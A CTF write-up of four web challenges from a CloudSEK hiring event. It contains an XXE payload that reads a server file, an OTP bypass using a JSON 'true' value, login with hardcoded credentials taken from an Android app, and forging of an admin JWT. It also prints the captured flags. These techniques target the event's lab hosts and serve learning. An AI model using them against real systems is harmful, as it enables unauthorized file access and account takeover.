# CTF Report

_Event:_ **CloudSEK Hiring CTF Challenge**

_Date:_ 06th Dec, 2025

_Participant:_ Jaswanth Sunkara (kick101)

---

# 1. Executive Summary

This report documents the methodologies, findings, and exploitation steps used to solve all challenges completed during the event. Each challenge was approached using a structured penetration testing methodology, including information gathering, vulnerability analysis, exploitation, and verification. Screenshots and evidence are provided to support all findings.

---

# 2. Scope

This report covers all challenges solved during the CTF, organized by category and individual challenge.

---

# 3. Methodology

The methodology is aligned with common penetration testing standards.

### 3.1 Information Gathering

Initial enumeration, service discovery, metadata extraction, and recon.

### 3.2 Vulnerability Analysis

Identification of security flaws, logic issues, misconfiguration, or cryptographic weaknesses.

### 3.3 Exploitation

Execution of techniques leading to successful flag retrieval.

### 3.4 Post-Exploitation (If Applicable)

Additional steps taken after initial compromise.

### 3.5 Documentation

Evidence collection, screenshots, logs, scripts and notes.

---

# 4. Challenge Overview

|Challenge Name|Category|Difficulty|Points|
|---|---|---|---|
|Nitro|Web|Easy|100|
|Bad Feedback|Web|Easy|100|
|Triangle|Web|Easy|100|
|Ticket|Web|Easy|100|

---

# 5. Detailed Challenge Write-Ups

## 5.1 Nitro

### 5.1.1 Challenge Information

**Category: web**

**Difficulty: Easy**

**Points: 100**

**Description:**

> Ready your scripts! Only automation will beat the clock and unlock the flag.
> 
> [](http://15.206.47.5:9090/)[http://15.206.47.5:9090](http://15.206.47.5:9090)

![image.png](attachment:93510d34-1d12-4a68-ac1e-2cd214975248:image.png)

### 5.1.2 Information Gathering

During initial reconnaissance, the following information was collected from the target web application and supporting services.

- `/` → default landing page displaying how to automate the `http` requests to retrieve the `flag`.

![image.png](attachment:ce7fe55d-b41d-4073-bba1-ea847d43ae78:image.png)

### 5.1.3 Exploitation

- I quickly decided to test it from `cli`

![image.png](attachment:64aee29b-5586-4961-9000-21f46d00e851:image.png)

![image.png](attachment:c8094e4e-b7da-47ce-aafa-35ddef8ed143:image.png)

- Then I gave the endpoint, challenge description, the `bash` one-liner I wrote, to the ChatGPT, to generate a bash script to automate this.

```bash
#!/bin/bash

HOST="<http://15.206.47.5:9090>"
TASK="$HOST/task"
SUBMIT="$HOST/submit"

while true; do

    # Fetch new task & overwrite cookies each time
    token=$(curl -s -c cookies.txt "$TASK" \\
        | sed -E 's/<[^>]*>/ /g' \\
        | grep -o '[A-Za-z0-9_/=-]\\+' \\
        | awk '{ print length, $0 }' \\
        | sort -nr \\
        | head -n1 \\
        | cut -d" " -f2-)

    # If no token found, retry loop
    [ -z "$token" ] && continue

    # Transform: reverse → base64
    rev=$(printf "%s" "$token" | rev | base64)

    payload="CSK__${rev}__2025"

    # Submit using latest cookies
    resp=$(curl -s -b cookies.txt -X POST "$SUBMIT" -d "answer=${payload}")

    echo "$resp"

    # Exit if solved or timed out
    if echo "$resp" | grep -qiE "FLAG|too slow"; then
        exit
    fi

done
```

![image.png](attachment:b2e2e2f4-5535-45a6-9c23-16feeb4948ec:image.png)

### 5.1.4 Flag

```bash
ClOuDsEk_ReSeArCH_tEaM_CTF_2025{ab03730caf95ef90a440629bf12228d4}
```

---

## 5.2 Bad Feedback

### 5.2.1 Challenge Information

**Category: web**

**Difficulty: Easy**

**Points: 100**

**Description:**

> A company rolled out a shiny feedback form and insists their customers are completely trustworthy. Every feedback is accepted at face value, no questions asked. What can go wrong?

Flag is in the root.

[](http://15.206.47.5:5000/)[http://15.206.47.5:5000](http://15.206.47.5:5000)

![image.png](attachment:74ef71ca-974c-42db-8dda-bdd44dfe8f87:image.png)

### 5.2.2 Information Gathering

During initial reconnaissance, the following information was collected from the target web application and supporting services.

- `/` - A feedback portal is displayed with a forum with `name` and `message` fields.

![image.png](attachment:5dd9740c-2c48-4c78-81a2-dea1cd4f9c64:image.png)

- `/feedback` - After sending test data to the forum.

![image.png](attachment:a194f5e2-5220-487c-81a0-e8aec508b8e6:image.png)

- Below `http` request with `XMl` data is sent via `caido`

![image.png](attachment:76da5233-6342-4dd5-8f41-b7a8be859f1e:image.png)

### 5.2.3 Exploitation

- Since `XML` data is being sent, we can try the classic `XXE` (XML External Entity Injection) to retrieve the flag that is in root.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///flag.txt">]>
<feedback>
    <name>&x;</name>
    <message>test</message>
</feedback>
```

- Below we send `payload` to the server.

![image.png](attachment:63c2e51c-bac7-4e17-9061-72867b02057c:image.png)

### 5.2.4 Flag

```bash
ClOuDsEk_ReSeArCH_tEaM_CTF_2025{b3e0b6d2f1c1a2b4d5e6f71829384756}
```

---

## 5.3 Triangle

### 5.3.1 Challenge Information

**Category: web**

**Difficulty: Easy**

**Points: 100**

**Description:**

> The system guards its secrets behind a username, a password, and three sequential verification steps. Only those who truly understand how the application works will pass all three.

Explore carefully. Look for what others overlooked. Break the Trinity and claim the flag.

> [](http://15.206.47.5:8080/)[http://15.206.47.5:8080](http://15.206.47.5:8080)

![image.png](attachment:a615950c-5834-4506-990d-3e6f252b8b26:image.png)

### 5.3.2 Information Gathering

During initial reconnaissance, the following information was collected from the target web application and supporting services.

- `/` → A Login forum with peculiar three OTPs.

![image.png](attachment:34bd8f33-83ec-4601-a990-a999192e7ac9:image.png)

- In the `source code` of the above endpoint, an interesting comment is found.
- We found a new endpoint here: `/google2fa.php` and that there could be backup files with `.bak` extension.
- Since the comment is not removed, we can assume that there could be backup files and google2fa might not be implemented.

![image.png](attachment:bdada885-5e91-43ae-860d-dce9a1b40592:image.png)

- `/login.php.bak` → we find `username` and `password` in this backup file. `admin:admin`

![image.png](attachment:87d03d8e-84f6-42e6-a4dd-b8d1d2ecbe9d:image.png)

- `/google2fa.php.bak` → Source code of `/google2fa.php` defines a class `Google2FA` that implements **Time-based One-Time Passwords (TOTP).**

![image.png](attachment:dbcd89ef-f06d-46b8-8de8-c23ce8038f5c:image.png)

- `generate_secret_key` function generates a 16 digit random string using `rand` `php` function.

```php
	public static function generate_secret_key($length = 16) {
		$b32 	= "234567QWERTYUIOPASDFGHJKLZXCVBNM";
		$s 	= "";

		for ($i = 0; $i < $length; $i++)
			$s .= $b32[rand(0,31)];

		return $s;
	}
```

- `verify_key` function verifies a given OTP against a Base32 secret:
    1. Converts secret to binary.
    2. Generates OTPs for the current timestamp + `window` steps (default ±4 → ±2 minutes).
    3. Returns `true` if any generated OTP matches the input, `false` otherwise.

```php
public static function verify_key($b32seed, $key, $window = 4, $useTimeStamp = true) {

		$timeStamp = self::get_timestamp();

		if ($useTimeStamp !== true) $timeStamp = (int)$useTimeStamp;

		$binarySeed = self::base32_decode($b32seed);

		for ($ts = $timeStamp - $window; $ts <= $timeStamp + $window; $ts++)
			if (self::oath_hotp($binarySeed, $ts) == $key)
				return true;

		return false;

	}
```

### 5.3.3 Exploitation

- Observe the `JSON` response, we gave a wrong `username` → server responded with `wrong username`

![image.png](attachment:8f7d7de0-89dd-4a42-bb5b-0a1809f7c47a:image.png)

- We give correct `username` but wrong `password` - we got `wrong password` as response.

![image.png](attachment:fec8805d-4a39-468f-9a33-6b859d0d2a4d:image.png)

- And, here we need correct `OTPs` or do we ?

![image.png](attachment:7668a063-ae7f-4d2f-91f7-ccfeaf787ae0:image.png)

- After fuzzing with bunch of values: `null` , `0e12345` , `""` , no quotes and without `otp` parameters.
- The value `true` severed the purpose.

![image.png](attachment:0db8a536-a7a5-406b-94af-335db28df539:image.png)

### 5.3.4 Flag

```bash
ClOuDsEk_ReSeArCH_tEaM_CTF_2025{474a30a63ef1f14e252dc0922f811b16}
```

---

## 5.4 Ticket

### 5.4.1 Challenge Information

**Category: web**

**Difficulty: Easy**

**Points: 100**

**Description:**

> Strike Bank recently discovered unusual activity in their customer portal. During a routine review of their Android app, several clues were uncovered. Your mission is to investigate the information available, explore the associated portal, and uncover the hidden flag. Everything you need is already out there! Connect the dots and complete the challenge.

The android package is `com.strikebank.netbanking` and the security review was conducted via `bevigil.com`.

Report can also be viewed by visiting the URL with the following format: `https://bevigil.com/report/<package_name>`

![image.png](attachment:18feb1f0-1472-4d92-98b1-6333467271c6:image.png)

### 5.4.2 Information Gathering

During initial reconnaissance, the following information was collected from the target web application and supporting services.

- `https://bevigil.com/report/com.strikebank.netbanking` → A detailed android `apk` file analysis report is displayed.

![image.png](attachment:f4a5f5b8-30dc-44b0-a41c-219ee4fe3200:image.png)

- Going to the assets on the right menu, we see hard-coded strings in the `strikebank` application.
- A new lead is found - `http://15.206.47.5.nip.io:8443`

![image.png](attachment:613e61fe-3f76-471b-8ffe-a72fc178c5e7:image.png)

- Visiting our new lead, we are greeted with login forum.

![image.png](attachment:abf35d3c-478d-4c11-b5db-474136c9684a:image.png)

- In the same file `strings.xml`, we find hard-coded `username` and `password` and also `jwt secret` encoded in `base64`

![image.png](attachment:3f76a99f-1fcb-4f4d-8989-e0b8052f4cc4:image.png)

![image.png](attachment:5c7e493e-252a-4e49-8a4c-3e26ac5caa37:image.png)

### 5.4.3 Exploitation

- First, we login with the credentials we found in the `strings.xml`

![image.png](attachment:ccf8a5e9-6d5c-4f2c-b90d-e55da60d0c36:image.png)

- In the `caido`, we can see there’s `JWT` being used for session management.

![image.png](attachment:02cce23f-551a-42dd-958e-a07498f595c7:image.png)

### 5.4.4 Post Exploitation

- Now, we can decode the `base64` `JWT` secret we found earlier in `strings.xml`

![image.png](attachment:edb5f973-2b8f-43b8-ba4c-25b96f241048:image.png)

- Visit [https://www.jwt.io/](https://www.jwt.io/) to modify the token.
- Decoding the original `JWT` we see `username` and `exp` in the payload:
- We can verify if the `JWT` secret we got works here:

![image.png](attachment:ada9fecd-37bb-4862-a882-3b0d48ed10e8:image.png)

- Since we found the valid secret, we can craft `admin` `JWT` token, and also update the timestamp to last a bit longer than the default.

![image.png](attachment:aad7c160-84a1-4517-b110-fef21b993436:image.png)

- Using the new modified `JWT` token, we retrieved the flag.

![image.png](attachment:20795de5-33c6-4dde-a8cd-20a073e9fb14:image.png)

### 5.4.5 Flag

```xml
ClOuDsEk_ReSeArCH_tEaM_CTF_2025{ccf62117a030691b1ac7013fca4fb685}
```

---

# Thank You!

